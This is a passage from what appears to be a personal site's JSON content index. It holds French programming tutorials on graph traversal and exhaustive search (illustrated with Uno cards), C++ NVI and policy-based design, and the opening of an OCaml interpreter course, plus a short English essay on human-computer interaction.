\" voit la video a l'heure \" + profondeur[N] Pour chaque voisin V de N Si V non visite profondeur[V] = profondeur[N] + 1 Marquer V comme visite aTraiter.enfiler(V) } } Et voilà. Vous pouvez également indiquer le nombre total de gens ayant vu la vidéo à chaque heure, je vous laisse le coder vous même, ce n'est pas très difficile. L'exhaustif et Uno Connaissez-vous Uno $&#94;{TM}$ ? Comme nous l'explique si bien Wikipédia , c'est un jeu de carte américain créé en 1971 par Merle Robbins. Il est pourvu de pleins de règles subtiles et de cartes agressives pour faire rager les petits comme les grands. Aujourd'hui, je ne vous propose pas de programmer ce célèbre jeu. A la place je vous propose plutôt de résoudre ce petit problème. Dans Uno, chaque joueur possède un certain nombre de cartes en main, qui peuvent être de 4 couleurs : bleues , vertes , rouges ou jaunes . Elles sont numérotées de 0 à 9. Il existe également certaines cartes spéciales (\"Joker\", \"Inversion\", \"Super Joker\"...) mais nous ne y intéresserons pas ici, par soucis de simplicité. Le jeu comporte un talon. On ne peut poser une carte sur le sommet de ce talon que si la carte au sommet du talon est : De même couleur que la carte qu'on joue De même valeur faciale que la carte qu'on joue Un petit exemple : poser un 7 rouge sur un 9 rouge est autorisé poser un 4 vert sur un 4 bleu est autorisé poser un 2 jaune sur un 2 jaune est autorisé poser un 6 bleu sur un 3 vert est interdit Il est ainsi possible d'empiler ces cartes de diverses façons en suivant ces règles, pour obtenir un talon plus ou moins haut. Comme vous n'avez rien de mieux à faire, vous voulez savoir, à partir d'un ensemble de cartes donné, quels sont tout les talons qu'il est possible de réaliser avec. Les cartes qui ne pourront pas être ajoutées au talon seront éventuellement laissées sur le côté. Vous pouvez empiler les cartes de votre choix dans n'importe quel ordre, tant que vous respectez les règles. Exercice : vous commencez à le connaître par cœur normalement. Quel est le graphe ? Quels sont ses caractéristiques ? Quelle question se pose-t-on sur lui ? Correction : Rappelez-vous : un graphe représente des objets et des relations entre ces objets. Ici chaque objet, chaque nœud, est donc une carte . Les arêtes sont définies par une valeur faciale ou une couleur commune . C'est donc un bon exemple de graphe dans lequel les arêtes peuvent être déduites du nœud à partir de certaines règles de construction simples. Ce graphe est cyclique . Certes, on ne peut pas utiliser une même carte plus d'une fois, mais il y a plus d'une manière de poser une carte, qui aboutira à d'autres situations où il serait ensuite théoriquement valide de poser cette carte si elle n'avait pas déjà été jouée. Ce graphe est non orienté . L'ordre dans lequel sont empilés les cartes n'a pas d'importance, puisque les règles ne s'intéressent qu'à la relation d'adjacence de deux cartes, indépendamment de leur ordre. Ce graphe est non pondéré (sapristi, un de plus !). Ce graphe est dense , selon moi. En effet il n'y a pas de caractérisation formelle entre un graphe dense et un graphe qui ne l'est pas, c'est laissé à l'appréciation de chacun. Laissez moi vous expliquer ma démarche. En supposant que l'on ait beaucoup de cartes, disons $N$, et qu'elles soient toutes tirées au hasard : en moyenne nous aurons $\\frac{N}{4}$ cartes de chaque couleur (car il y a 4 couleurs). Toutes les cartes de même couleur seront au moins reliées entre elles. Donc, en moyenne, chaque carte sera reliées à au moins $\\frac{N}{4}$ autres cartes. Chaque carte est aussi reliée à un $\\frac{1}{10}$ (car 10 chiffres) des cartes des 3 autres couleurs, soit $\\frac{3\\times N}{40}$ autres cartes en moyenne. Cela fait une moyenne de $0,325\\times N$ arêtes par nœud. Le degré de chaque nœud n'est pas constant : il dépend de $N$. Ce qui porte le total à environ $0,162\\times N&#94;2$ arêtes, car c'est un graphe non orienté (il ne faut pas compter deux fois chaque arête). Le nombre d'arêtes du graphe est fonction de $N&#94;2$. On peut donc qualifier ce graphe de dense. Et il est suffisamment dense pour rendre la matrice d'adjacence plus intéressante que la liste. Voici le graphe associé à un ensemble de 20 cartes (5 de chaque couleur). En théorie chaque carte devrait être reliée à elle même. Mais comme on ne peut pas utiliser deux fois la même carte (ce qui n'empêche pas celle-ci d'être présente en plusieurs exemplaires dans le jeu de départ), on sait d'avance que ces arêtes (qu'on nomme boucle ) ne nous serviront pas. Autant les supprimer maintenant. On souhaite connaître quels sont tout les talons possibles. Un talon est caractérisé par un ensemble de cartes dans un certain ordre. Et les contraintes d'adjacence de deux cartes sont celles des arêtes du graphe ! Par conséquent, chaque talon peut être représenté par un chemin du graphe : l'ordre de visite des nœuds et la taille du chemin suffit à définir le talon. Pour générer tout les talons possibles, il faut donc générer tout les chemins du graphe ! L'exhaustif Wiktionnaire : Exhaustif : qui inclut tous les éléments possibles d'une liste, qui traite totalement un sujet. Nous cherchons une liste de tout les talons possibles, sans en oublier aucun. Il nous faut donc une liste exhaustive des talons possibles. Cela nécessite un algorithme capable d'effectuer une énumération exhaustive de tout les chemins du graphe. D'où le nom \"exhaustif\". Il faut trouver une méthode systématique pour dénombrer les chemins du graphe. Comment procéderions-nous \"à la main\" ? Par exemple, nous pourrions prendre une carte et l'ajouter au talon. Puis prendre une autre carte et l'ajouter au talon (en respectant les règles). Puis continuer à ajouter des cartes qu'il est possible d'en ajouter, sans réutiliser deux fois la même (évidemment). Et lorsqu'on est bloqué ? Une retire une carte au sommet du talon et on met une autre à la place, et c'est reparti ! On continue d'ajouter des cartes jusqu'à ce qu'on soit forcé d'en retirer une au sommet pour la remplacer par une autre qui n'a pas déjà été posée à cette hauteur et avec ce talon spécifique en dessous. Ainsi, à la fin, tout les talons auront été construits. Vous avez remarqué ? Un talon est une pile, donc nous aurons sûrement affaire à une pile dans cet algorithme ! En voici le pseudo-code : Fonction listerChemins(Graphe G) { Chemin chemins[] Pour chaque noeud N autresChemins = exhaustif(G, N, cheminVide) chemins.concatener(autresChemins) Renvoyer chemins } Fonction exhaustif(Graphe G, Noeud N, Chemin C) { Marquer N comme utilise C.ajouter(N) Chemin chemins[] chemins.ajouter(C) Pour chaque voisin V de N Si V inutilise autresChemins = exhaustif(G, V, C) chemins.concatener(autresChemins) Marquer N comme inutilise Renvoyer chemins } Sans grande surprise, ici, la pile est la pile d'appel. Mais une fois encore, cet algorithme peut être passé sous forme itérative si le besoin s'en fait sentir. Cette fonction ressemble beaucoup à celle du DFS , à deux exceptions près. Premièrement, elle retourne quelque chose : la liste des chemins. Secondement, et c'est là le point le plus important : l'état d'un nœud n'est pas définitivement fixé. A l'entrée de la fonction le nœud est marqué comme \"utilisé\"; en revanche, à la sortie de la fonction, il est de nouveau marqué comme \"inutilisé\". Ainsi, la fonction exhaustif va pouvoir traiter plusieurs fois le même nœud, ce qui est somme-toute logique puisque qu'un même nœud peut faire parti de plusieurs chemins distincts. L'importance de marquer un nœud comme utilisé durant son utilisation (comme les toilettes publiques à verrou coloré) est la même que celle du DFS : empêcher les appels récursifs infinis en bouclant dans un cycle. Sur le graphe ci-dessous, après un appel sur le nœud A, l'ordre d'exploration des nœuds pourrait être : A - B - D - F - E - C - G - E - F - B - D . Cela générerait les chemins suivants : A A - B A - B - D A - B - F A - B - F - E A - C A - C - G A - E A - E - F A - E - F - B A - E - F - B - D Et cela juste avec le nœud A comme origine ! Je vous épargne les autres. Comme vous pouvez le constater le nombre de chemins différents augmente très vite et atteint un nombre important, même sur un graphe de petite taille. Ce qui nous amène tout de suite à une question épineuse : quelle est la complexité en temps et en mémoire de l'algorithme ? Commençons par la complexité en temps. Quel est le pire des cas ? Le pire des cas serait un jeu de carte où toutes les cartes sont reliées entre elles (typiquement : toutes de même couleur), ce qui revient à travailler sur un graphe complet . Ainsi, je dispose de $N$ choix pour le premier élément du talon. Puis de $N-1$ pour le second. Puis de $N-2$ pour le troisième, et ainsi de suite. Le nombre de talons possible est donc égal à $N \\times (N-1) \\times (N-2) \\times ... \\times 2 \\times 1 = N!$ En fait, toutes les permutations de cartes sont possibles (puisque toutes les cartes peuvent être adjacentes). Et le nombre de permutations de $N$ éléments est bien égal à $N!$. Cet algorithme est donc en $O(N!)$ en temps. La fonction factorielle croit asymptotiquement plus vite que la fonction exponentielle. Pour cette raison, même sur des instances de petite taille, certains problèmes sont insolubles en un temps raisonnable. Pour vous faire une idée, 20! = 2 432 902 008 176 640 000. Donc si le graphe ci-dessus était complet, il faudrait plusieurs dizaines de milliers d'années de calcul. Heureusement il ne l'est pas ! De mon côté j'ai trouvé 437 672 443 chemins différents (vous pouvez vérifier si l'envie vous en prend). Quant à la complexité en mémoire, elle est nécessairement $O(N!)$ elle aussi, puisqu'il s'agit là du nombre de solutions. Cependant, si vous n'aviez qu'à dénombrer les solutions (sans les produire), vous auriez alors un algorithme en $O(N)$, car la profondeur de récursion peut atteindre N nœuds. La recherche exhaustive, bien que donnant des résultat exacts de par son exhaustivité, ne peut pas être utilisée en pratique pour tout les problèmes, à cause de sa lenteur. Pour cette raison, de nombreux problèmes sont résolus avec des algorithmes donnant une réponse approchée (ou exacte mais dont on ne peut pas prouver qu'elle est exacte) qui ont une durée d'exécution plus courte. Ces algorithmes sont des sujets de recherche encore actifs qui mériteraient un tutoriel entier à eux seuls, donc nous n'en parlerons pas plus ici. Ce tutoriel n'est pas terminé ! D'autres chapitres viendront : III] Problèmes usuels de graphes Tri topologique Circuit Eulérien Nœuds essentiels Arêtes essentielles Algorithmes dynamiques pour les DAG (Directed Acyclic Graph) IV] Pathfinding BFS (on en reparle) Ford-Bellman Dijkstra Floyd-Warshall A* et autres heuristiques du même type Restez au courant si ça vous intéresse. Vous comprendrez plus tard. ↩"},{"tags":"wiki","url":"https://yliesc.github.io/pages/wiki/hci-reflection","title":"HCI Reflection","text":"HCI Reflection HCI is an acronym, which stands for \"Human-Computer Interactions\". The term is used to describe the way in which people connect with computers, more specifically how computer software is designed to enhance the user experience. This is achieved by improving the user interface, which is where the user will always interact with the system. When discussing HCI, you need to take into account the usability of the user interface, which is how effective and efficient the user interface is. Moreover, it is important to also take into account differences in cultures and nations as users learn and retain information differently depending on where they are from and how they are taught. The study of HCI is complex because technology and software are constantly evolving, therefore, forms of HCI are always changing and new forms are being developed. HCI is important because it directly impacts the final user and their experience with the system. HCI is more important than ever because people interact with computing systems in every aspect of their lives as we live in a modern world governed by technology. What is more, technology is advancing at such a fast rate, meaning that computing systems need to remain updated and consistent with the needs of users, thus user interfaces must be designed in a way that guarantees an optimal user experience. To take the example of book history \"Inviting Disaster\", the fact that the designers placed all the controls at the same places forced the pilot to landing manually. Fortunately he had the experience to do so, but this design flaw would have had to be anticipated by a more usable HCI design. Beside that, designing human-computer interactions well have an important role in an enterprise. On the one hand, when users of the system can use it easily and without having to handle a new way to proceed, they can use the product more efficiently and increase their productivity. On the other hand, on the business side, if final users are satisfied when they use the product, it will directly impact on the profitability. Even though HCI is important, it is difficult to find better ways to improve the user experience and usability of computing systems. Creating user interfaces with few errors and supporting faster user execution is not only about common sense or matter of luck but based on training and experience that impact on designer's mental models. And even with years of experience and training, it is never easy to bring a fix. Don Norman reports: \"A true understanding of a tool can only come through usage, in part because new tools change the system, thereby changing both needs and requirements.\" In that, a deep understanding of the users is even more important than technical skills in making user interfaces. Thereby, that is why HCI has to be be take in account at the very beginning of the software development process. At this point, Human-Centered Design (HCD) can be a solution. HCD is a design approach where the needs, expectations and characteristics of end users are taken into account at each stage of the product iterative development process, stages that are Observation, Ideation, Prototyping and Testing. Bibliography https://fr.wikipedia.org/wiki/Interactions_homme-machine https://pdfs.semanticscholar.org/3662/f05e01ec0eb8f56e8323b5c27c9338393299.pdf https://prezi.com/8kdud-pwhz4s/impact-of-hci-on-societythe-economy-and-culture/# Chiles, J.R. (2001). The Really Bad Day. In Inviting Disaster: Lessons from the Edge of Technology. Harper Business: New York, 117-128 Brooks, F.P. Jr. (1987). No silver bullet: Essence and accidents of software engineering. Computer, 20(4), 10-19"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/idiome-nvi-parametrage-par-politique-en-c","title":"Idiome NVI & Paramétrage par politique en C++","text":"Introduction & Motivations Cet article, sur le C++, vise à présenter d'une part l'idiome NVI, pour « Non Virtual Interface », et d'autre part, une technique de conception développée par Andreï Alexandrescu, notamment présentée dans son livre Modern C++ Design, à savoir le paramétrage pas politique. Le choix de présenter au sein du même article un idiome et une méthode plus générale d'architecture logicielle est motivé par le fait que la combinaison des deux permet de produire du code robuste, plus spécifiquement destiné à être réutilisé (notamment dans le cadre d'un framework ou d'une bibliothèque). Dans un premier temps nous aborderons l'idiome NVI, ses applications et sa mise en place. Ensuite, nous verrons ce qu'est le paramétrage par politique et la manière d'identifier des comportements transversaux au sein d'un ensemble de classes. Enfin, nous mettrons en application la combinaison des deux techniques afin de produire du code tirant bénéfice de ces deux techniques. Dans la suite de l'article on se placera dans une situation générale où l'on écrit du code dit « service », pour un client qui écrira du code dit « client ». Introduction & Motivations L'idiome NVI Violation du SRP Programmation par contrat Inversion de contrôle Ce qu'il faut retenir Un mot sur Patron de Méthode Paramétrage par politiques Présentation Identification des politiques Mise en place Combiner les deux techniques Limitation du type de politique Une alternative Allez plus loin : politique de base à la construction logicielle Conclusion L'idiome NVI Violation du SRP Une façon classique de considérer une interface est la suivante : class InterfaceService { public : virtual void service (); // Eventuellement virtuel pur }; Une classe concrète pourra ou devra (selon ce que propose l'interface) réimplémenter le service de la sorte : class MonService : public InterfaceService { public : virtual void service () { // Implémentation de mon service } }; Cette approche très utilisée en Java notamment propose un désavantage de taille. En effet, en procédant de la sorte, nous donnons deux responsabilités à la classe concrète MonService : L'implémentation du service La réalisation du service Ceci est donc une violation du « Single responsibility principle » qui veut que chaque objet ne se voit accorder qu'une unique responsabilité (et que cette responsabilité doit être complètement encapsulée par cette classe). Aidons-nous de ce petit exemple de code client pour mieux comprendre : class A { public : void operator ()( InterfaceService & _serveur ) { _serveur . service (); } }; int main ( void ) { A a ; MonService s ; a ( s ); return 0 ; } On voit très clairement que le code client s'adresse directement à MonService malgré le fait qu'il manipule InterfaceService. Enfin, le service est réalisé par MonService, ce qui semble légitime. La mauvaise distribution des responsabilités au sein d'une architecture est source de rigidité et va donc à l'encontre de la ré-utilisabilité et augmente la maintenance par une complexification du code. Programmation par contrat L'idiome NVI permet de distribuer ces responsabilités par la définition d'un contrat entre l'Interface et la classe concrète : l'Interface se charge de la vérification des invariants et préconditions sur le service et en contrepartie, la classe concrète se charge d'implémenter le service concret. Voici l'implémentation de l'idiome : class InterfaceService { public : void service (); // Notez la non-virtualité private : // Notez le private virtual void _service (); // Eventuellement virtuel pur }; InterfaceService :: service () { // Préconditions & invariants // ... _service (); // Postconditions & invariants // ... } Contrairement à la première approche, ici c'est bien InterfaceService::service qui sera appelé par le code client et qui lui même appellera l'implémentation du service (soit celle qu'il propose par défaut, soit celle redéfinie par la classe concrète MonService). Inversion de contrôle On a ici une vraie séparation des responsabilités en plus d'une factorisation du code appréciable : les préconditions et postconditions sont réalisées à un unique endroit : dans l'interface, c'est à dire dans le code service. Au delà du respect du SRP, cela permet également de centraliser en un endroit les préconditions relatives au contrat d'appel entre le code client et le code service : après tout, le never trust user inputs s'applique également avec un client. Qui nous garantit que si le client écrit une classe héritant de InterfaceService, il pensera à vérifier les invariants nécessaires au bon fonctionnement de la classe ? En fait, le NVI permet une inversion de contrôle, caractéristique d'un framework : c'est le code service qui va appeler le code client et non l'inverse comme c'est le cas avec une simple bibliothèque. La différence est qu'ici, cette inversion de contrôle a une granularité très fine puisqu'elle est à l'échelle d'une classe, là où elle est généralement à l'échelle du flux d'exécution pour un framework. Cette inversion de contrôle permet de mieux faire face à la hantise du designer : le Fragile Base Class problem. Ce qui permet de réaliser cette inversion de contrôle est non seulement l'appel à l'implémentation du service par l'interface mais aussi et surtout l'encapsulation de l'implémentation du service dont la visibilité est privée dans l'interface, ce qui fait qu'elle sera impossible à appeler depuis la classe concrète du fait de sa virtualité. On s'assure alors que le code client n'appellera jamais le code service. Dans de très rares occasions, cela peut cependant être utile de procéder de la sorte. Pour cela, il est toujours possible de définir la méthode _service avec une visibilité en protégée, ce qui permettra au code client d'appeler l'implémentation par défaut : class InterfaceService // Évidemment on ne devrait avoir d'un seul service, ceci est juste pour l'exemple ! { public : void service (); protected : virtual void _service (); private : virtual void _service2 (); }; class MonService : public InterfaceService { virtual void _service () { InterfaceService :: _service (); // OK } virtual void _service2 () { InterfaceService :: _service2 (); // ERROR } }; Ce qu'il faut retenir NVI aide à localiser les invariants à un unique endroit permettant de prévenir ou sécuriser le code client quand à la consistance de ces invariants. L'inversion de contrôle permet de respecter le Single Responsability Principle et de mieux maîtriser le problème du Fragile Base Class. Pour la mise en place, citons Herb Sutter, dans son article Virtuality : Prefer to make interfaces nonvirtual, using Template Method design pattern. Prefer to make virtual functions private. Only if derived classes need to invoke the base implementation of a virtual function, make the virtual function protected. A base class destructor should be either public and virtual, or protected and nonvirtual. Un mot sur Patron de Méthode Il est important d'insister sur le fait que NVI n'est pas la même chose que le patron de conception Patron de Méthode. En effet, la ressemblance est très forte sur le plan technique puisque ce patron de conception s'articule autour d'une interface définie ou redéfinie par les besoins concrets au niveau de sous-classes. La principale différence provient des motivations : l'objectif d'un patron de conception Patron de Méthode est de proposer un découpage logique d'un algorithme ou d'un service en méthodes dont l'implémentation de certaines sera reléguée à des sous-classes concrètes, permettant de modifier l'algorithme selon diverses considérations sans pour autant risquer de changer la structure générale de l'algorithme. Paramétrage par politiques Présentation Le paramétrage par politique est une technique de programmation développée et démocratisée par Andrei Alexandrescu dans son livre Modern C++ Design: Generic Programming and Design Patterns Applied et dans la bibliothèque Loki dédiée à la méta-programmation en C++. Concrètement, il s'agit de profiter de l'héritage multiple et de la méta-programmation pour permettre de séparer les différents comportements d'une classe ou de plusieurs classes et de créer sur mesure des comportements en combinant plusieurs politiques. Identification des politiques La clef d'un paramétrage par politique efficace réside dans l'analyse des différents comportements d'une classe ou d'un ensemble de classes. Imaginons que nous ayons à créer une bibliothèque de gestion de graphes. Un graphe peut être représenté sous différentes formes : matrice d'adjacence, matrice d'incidence , ou liste de successeurs. Chaque représentation à ses avantages et ses inconvénients en fonction des applications. On pourrait aisément créer 3 classes différentes mais cela ne serait pas très pertinent. On pourrait simplement templater la classe de graphe mais chaque type donné n'a pas la même API. De plus, imaginons qu'un graphe puisse être partagé entre plusieurs thread ou non selon les applications. Sans paramétrage par politique, il faudrait un nombre de classes égales au nombre de facteurs de comportement multiplié par le nombre de modes par facteur. Cela apporterait évidemment du code redondant et une maintenabilité moindre puisque dans le cas d'un paramétrage par politique le but est d'isoler complètement un comportement. Pour modifier l'intégralité du modèle multithread d'une application, la modification d'une seule classe de politique est nécessaire. Chaque facteur est représenté par une classe abstraite permettant de définir l'API commune à tous les modes et qui pourra être utilisée par les classes paramétrées avec ce facteur. Les classes concrètes implémentent chacun des modes de la politique. Enfin, la classe de services qui doit être paramétrée par politique va être templatée avec chacune des politique et en hériter de manière publique ou privée selon les besoins. Le mot clef pour distinguer les comportements d'une classe est l'orthogonalité. En effet, les politiques doivent être totalement orthogonale et de fait, être indépendantes. On perd tout l'intérêt, en terme de maintenabilité et de simplicité dans le cas où une politique dépend d'une autre. Dans le cas de notre graphe, la représentation des données et son accès sont indépendants de la politique de multithread. C'est à la classe concrète de graphe d'utiliser ces deux politiques pour rendre ses services indépendamment des modes de politique choisis. Mise en place La mise en place est aisée. Dans un premier temps, il suffit de définir des classes de politiques. Nous choisissons de créer une hiérarchie de classes pour chaque facteur. Dans l'exemple évoqué à la section précédente, nous avons d'une part la politique relative au contexte parallèle et la politique relative à la représentation (et l'utilisation) des données du graphe. class ThreadingModel { protected : virtual void Lock () = 0 ; }; class MultiThread : public ThreadingModel { protected : virtual void Lock () { m . lock (); } std :: mutex m ; }; class MonoThread : public ThreadingModel { protected : virtual void Lock () { } }; // ... Autres modeles ... On définit la classe principale de graphe et on la paramétrise à l'instanciation selon les besoins : template < class Rep = AdjacenceMatrix , class ThreadModel = MonoThread > class Graph : public Rep , protected ThreadModel { public : bool IsConnected () const { ThreadModel :: Lock (); return Rep :: IsConnected (); } }; using GraphInciMT = Graph < IncidenceMatrix , MultiThread > ; using GraphAdjMT = Graph < AdjacenceMatrix , MultiThread > ; // Exemples Graph a ; // Adjacence, MonoThread GraphInciMT b ; // Incidence, MultiThread GraphAdjMT c ; // Adjacence, MultiThread La classe Graph fait appelle à l'aveugle à sa politique de thread ainsi qu'à sa politique de représentation. La bonne écriture d'une politique est guidée par l'API de la classe abstraite en haut de la hiérarchie mais aucune vérification de type n'est effectuée par la classe Graph. Ainsi, un client pourrait écrire sa propre politique qui ne serait pas basée sur une des classes abstraites du code service. La partie définissant les alias n'est pas du simple sucre syntaxique puisqu'il contribue également à la maintenabilité de l'application. L'utilisateur final utilise des types en dur, sans template, ce qui permet, si le besoin s'en fait sentir, de ne changer le template qu'à un unique endroit. Combiner les deux techniques En observant attentivement l'exemple utilisant le paramétrage par politique, on se rend compte que le but de chaque politique est d'apporter un ensemble de services aux classes. On peut donc structurer nos hiérarchies de politiques en utilisant l'idiome NVI, leurs apportant tous les avantages cités précédemment. class ThreadingModel { protected : void Lock () { Logger << std :: this_thread << \" : acquisition du lock.\" << std :: endl ; _Lock (); } private : virtual void _Lock () = 0 ; }; class MultiThread : public ThreadingModel { private : virtual void _Lock () { m . lock (); } std :: mutex m ; }; class MonoThread : public ThreadingModel { private : virtual void Lock () = default }; // ... Autres modeles ... Le reste ne change. Cependant, cela présente le désavantage de briser un des intérêts du NVI qui était de localiser les vérification des préconditions et des invariants à un seul endroit. En effet, l'utilisateur peut très bien écrire une classe de politique possédant l'interface requise par la classe paramétrée, sans respecter les invariants intrinsèques au service offert par la politique. Limitation du type de politique Nous pouvons cependant forcer l'héritage de la classe de politique depuis la classe base de la hiérarchie par l'utilisation d'une assertion statique. Aucun overhead en runtime n'est à prévoir puisque l'assertion est statique. template < class Rep = AdjacenceMatrix , class ThreadModel = MonoThread > class Graph : public Rep , protected ThreadModel { public : Graph () { static_assert ( std :: is_base_of < ThreadModel , ThreadingModel >:: value , \"ThreadModel must inherit from ThreadingModel class\" ); } // ... }; Le choix de la vérification basée sur l'interface ou celle plus stricte, basée sur l'interface et le type de la politique dépend du degré de liberté que vous souhaitez accorder à l'utilisateur. Une alternative Comme il m'a été fait remarqué, à la relecture de cet article, l'utilisation de classes virtuelles et de template a un effet certain sur les performances en plus de n'avoir qu'un avantage : l'utilisation de politiques dynamiques. Il a alors été proposé une alternative intéressante, qui permet en outre, de n'effectuer la vérification que sur demande explicite : template < typename Policy > class AssertChecker : protected Policy { protected : void service ( int i ) { assert ( i > 42 ); Policy :: service ( i ); } }; class Policy1 { void service ( int i ); }; class Policy2 { void service ( int i ); }; template < typename Policy > class Concret : protected Policy { .... }; Concret < Policy1 > c1 ; // Sans vérification de contrat Concret < AssertChecker < Policy1 >> c1bis ; // Avec vérification de contrat Allez plus loin : politique de base à la construction logicielle Il peut parfois être intéressant, pour des questions de commodité, d'avoir une politique par défaut qui puisse être modifiée dans l'ensemble du logiciel lors de la compilation. L'exemple le plus classique est celui de la politique du modèle de thread utilisée. En fonction de la machine sur laquelle va tourner le programme (ou des programmes utilisant la bibliothèque s'il s'agit d'une bibliothèque), on peut vouloir par défaut l'utilisation d'un unique thread et se passer de l'overhead généré par la protection des accès concurrents, ou alors au contraire utiliser l'ensemble de cœurs disponibles, choisir le mode de parallélisme (thread standards ou OpenMP par exemple, voire MPI), etc. Évidemment, on veut toujours pouvoir redéfinir localement la politique pour des raisons diverses et variées (dans notre exemple, l'utilisateur peut juger que localement il n'est pas nécessaire d'utiliser un modèle parallèle car il y aurait un overhead trop important sur une instance donnée). Pour se faire on peut envisager la définition d'une constante via le préprocesseur et la définition d'un alias permettant d'avoir un vrai type à passer en paramètre comme politique : #ifndef DEFAULT_THREADING_MODEL #define DEFAULT_THREADING_MODEL MultiThread #ifndef DEFAULT_GRAPH_DATA #define DEFAULT_GRAPH_DATA AdjacenceMatrix using DefThreadingPolicy = DEFAULT_THREADING_MODEL ; using DefGraphDataPolicy = DEFAULT_GRAPH_DATA ; template < class Rep = DefGraphDataPolicy , class ThreadModel = DefThreadingPolicy > class Graph : public Rep , protected ThreadModel { } Cela n'empêche en rien d'utiliser des alias spécialisant les templates comme vu précédemment. Il suffit ainsi de redéfinir le constante souhaitée au moment de la compilation : g++ -DDEFAULT_THREADING_MODEL=MonoThread ... Conclusion Comme n'importe quel patron de conception et autre technique de conception, l'utilisation du NVI ou du paramétrage par politique ne doit pas être systématique mais faire l'objet d'une motivation réelle vis à vis d'une situation où elle est pertinente. Ces situations n'ont pas été décrites en détail puisqu'il est impossible d'en dresser une liste exhaustive : l'important est d'identifier les situations où leur utilisation est bénéfique ou résout un problème donné. L'utilisation stricto sensu des deux techniques combinées présente le désavantage d'un surcoût naturel lié à l'utilisation de méthodes virtuelles avec des templates ce qui peut être rebutant. Cette utilisation n'est intéressante que dans le cas où l'on veut absolument maintenir la consistance d'une hiérarchie de classes de politique. Dans les autres cas, il est certainement plus intéressant d'utiliser l'alternative proposée. J'espère que cet article vous aura donné les grandes lignes permettant de justifier l'utilisation du NVI et du paramétrage par politique, ainsi que quelques idées pour combiner les deux et faciliter la vie aux utilisateurs de votre code."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/interpreter-un-petit-langage-imperatif-avec-ocaml","title":"Interpréter un petit langage impératif avec OCaml","text":"Vous avez appris un langage de programmation, vous avez écrit plein de jolies choses avec. Une fois vos codes écrits, vous utilisiez un programme externe pour les exécuter (ou les compiler puis les exécuter). Vous avez même peut-être travaillé avec succès sur des gros projets qui ont fait appel à toutes vos connaissances de votre langage favori. Tout cela est très bien. Mais savez-vous comment ce programme externe avait lui-même été créé ? Si vous n'en avez aucune idée, ou que vous êtes tout simplement curieux de le savoir, vous êtes au bon endroit. Cet article vous montrera en détail comment interpréter un petit langage impératif, sous forme de cours-TP où nous mettrons cela en place ensemble. Commençons ! Comment nous fonctionnerons Prérequis Notre langage Les différentes étapes de l'interprétation L'analyse lexicale Mots, lexèmes et découpage Les expressions rationnelles Ocamllex Le commencement Les mots-clefs Les nombres, la première loi et les alias Les variables et la deuxième loi Les caractères blancs Les commentaires : une nouvelle règle Utilisation pratique de notre analyseur L'analyse syntaxique Arbres syntaxiques Les grammaires hors-contexte Menhir Présentation Installation Redéfinissons nos lexèmes Passons aux choses sérieuses Où l'on termine l'écriture de notre AST avec les « commandes » du langage Compilons ! Au secours, ça ne marche pas ! L'interprétation Commençons ! Comment nous fonctionnerons Ce « cours » est écrit sous la forme d'un TP : en le parcourant, nous construirons progressivement notre interpréteur. Les explications pratiques du fonctionnement des outils se font beaucoup à partir du code, et vous avez à la fin de chaque partie la source complète du fichier final que nous aurons écrit. Cela veut dire que, bien sûr, vous pouvez vous contenter de faire un copier-coller des différents fichiers et des commandes pour arriver à obtenir un interpréteur qui fonctionne. Ce serait cependant dommage pour vous : je vous encourage à essayer au maximum de coder par vous-mêmes, et à vous servir du corrigé quand vous n'arrivez pas à comprendre quelque chose ou que vous voulez comparer votre solution. Bref, il est là volontairement, mais vous apprendrez plus si vous le copiez le moins possible. Prérequis Interpréter un langage n'est pas quelque chose de très compliqué (surtout si le langage est suffisamment simple), mais vous devez tout de même savoir certaines choses. Concrètement, vous serez capable de lire et de comprendre ce cours si vous maîtrisez un minimum le langage OCaml. Notamment, vous devez être bien à l'aise avec les types récursifs (définition et utilisation), et savoir appliquer ces connaissances à la manipulation d'arbres. Vous devez également connaître les bases des entrées/sorties (notamment la lecture dans un fichier) et la programmation dans plusieurs fichiers. Enfin, il est plus que recommandé de connaître les bases d'un langage impératif, par exemple le C ou le Python. Notre langage Avant de commencer à implémenter notre langage, nous allons choisir à quoi il va ressembler. Nous ferons quelque chose de simple : nous allons écrire un interpréteur pour un langage impératif minimaliste. Voici donc les éléments de base de notre langage : les entiers, qui seront soit écrits directement, soit contenus dans des variables les opérations + , - et * sur les entiers les booléens, incluant true , false et la comparaison > sur les entiers les opérations and , or et not sur les booléens les boucles while les conditions if une instruction print pour afficher un entier Les opérations sur les entiers et les booléens seront régies par les règles de priorité usuelles. Pour agir sur ces priorités, on pourra utiliser les parenthèses. Pour affecter une valeur à une variable, on utilisera := (la création de la variable sera effectuée à sa première affectation, comme en Python par exemple). Et, comme tout langage qui se respecte (et le nôtre se respecte particulièrement, s'il vous plaît !), nous aurons des commentaires : // pour un commentaire sur une ligne, et /* ... */ pour des commentaires multi-lignes. Voilà un exemple de code pour que vous visualisiez bien la syntaxe (qui est très simple) : // On initialise les variables n := 5 f := 1 /* boucle principale /* commentaire imbriqué */ */ while n > 0 { f := f * n n := n - 1 } print f /* On peut même print-er des expressions numériques */ print 3 + 4 * 5 Les différentes étapes de l'interprétation Pour comprendre les différentes étapes de l'interprétation d'un programme, il est souvent pratique de faire la comparaison avec la langue que vous parlez tous les jours. Imaginez que vous discutiez avec un ami, et qu'il vous dise « Le français est une belle langue ». Si vous, vous comprenez tout de suite cette phrase, ce n'est pas le cas de votre ordinateur. Voilà les étapes qu'il suivra pour en déchiffrer le sens : Initialement, il ne connaît qu'une suite de caractères. Parallèlement, c'est comme si vous en étiez au stade où vous avez compris : « leufranssèhètunebèlelang ». La première étape est l'analyse lexicale : la phrase sera découpée en une suite de mots connus. Vous savez alors que votre ami a prononcé successivement les mots « le », « français », « est », « une », « belle » et « langue ». Vous connaissez alors la nature de chaque mot individuellement (« le » est un article défini, « français » est un substantif…), mais vous ne savez pas encore comment ils sont reliés entre eux. La deuxième étape est l'analyse syntaxique . À partir de votre suite de mots, vous construisez des phrases. Vous savez maintenant que « le français » est un groupe nominal, et qu'il est sujet du verbe « est ». Mais vous ne savez toujours pas quel sens a cette phrase. La dernière étape est l'analyse sémantique . Maintenant que vous connaissez la structure de la phrase, vous pouvez comprendre ce qu'elle veut dire. En puisant dans votre vocabulaire, vous savez maintenant que votre ami vous a indiqué que la langue que vous parlez, le français, a des caractéristiques qui la rendent tout à fait intéressante. Votre interpréteur fonctionnera (presque) exactement de cette façon. Si vous ne voyez pas encore parfaitement comment tout cela va s'agencer, 